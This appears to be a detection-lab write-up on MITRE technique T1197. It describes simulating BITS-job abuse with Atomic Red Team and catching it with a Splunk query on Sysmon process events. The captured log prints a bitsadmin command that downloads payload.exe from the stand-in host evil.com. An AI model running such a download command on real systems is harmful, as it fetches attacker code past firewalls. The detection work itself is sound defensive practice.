# T1197 — BITS Jobs (silent background download)

## What This Attack Does

The attacker uses the Windows Background Intelligent Transfer Service
(BITS) to silently download malicious files in the background. BITS is
a legitimate Windows service designed to download Windows updates without
interrupting the user. Attackers abuse it because BITS transfers are
often whitelisted by firewalls and security tools, the downloads
survive reboots, and they run silently with no visible window.

## How I Simulated It

Tool: Atomic Red Team
Command executed on Windows Server target:

Invoke-AtomicTest T1197 -TestNumbers 1

## What Splunk Captured

Sysmon Event ID 1 (Process Creation) fired showing:
- Image: C:\Windows\System32\bitsadmin.exe
- User: WINDOWS-SERVER\Administrator
- CommandLine: bitsadmin /transfer maliciousJob /download /priority normal http://evil.com/payload.exe C:\temp\payload.exe

## SPL Detection Query

index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=1 Image="*bitsadmin.exe" CommandLine="*transfer*"
| table _time, ComputerName, User, CommandLine, ParentImage

## Result

Splunk successfully detected BITS job abuse for file download.
Alert fired within seconds of the command running on the target.

## Screenshot

[Splunk alert screenshot — to be added]
